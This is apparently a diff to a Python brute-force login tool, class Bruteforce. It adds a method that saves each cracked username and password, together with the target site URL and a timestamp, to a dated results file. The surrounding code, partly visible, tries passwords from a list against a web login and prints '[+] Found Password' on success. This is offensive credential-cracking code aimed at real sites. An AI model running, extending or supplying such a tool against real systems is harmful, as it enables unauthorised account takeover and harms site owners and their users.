@@ -1,3 +1,4 @@
+import datetime
 import requests
 from termcolor import colored
 
@@ -58,10 +59,21 @@ class Bruteforce():
 					print(colored(('[+] Found Password: ==> ' + password), 'green'))
 					result['username'] = self.username
 					result['password'] = password
+					self.write_credentials_to_file(result)
 					return result
 
 		print('[!!] Password Not In List')
 		return result
+	
+	def write_credentials_to_file(self, credentials):
+		current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+		filename = f"bruteforce_results_{current_time}.txt"
+		with open(filename, 'a') as file:
+			file.write(f"Site: {self.url}\n")
+			file.write(f"Username: {credentials['username']}\n")
+			file.write(f"Password: {credentials['password']}\n")
+			file.write(f"Time: {current_time}\n")
+			file.write("\n")
 
 if __name__ == "__main__":
 	use_defaults = input('[+] Use default inputs? (y/n): ')
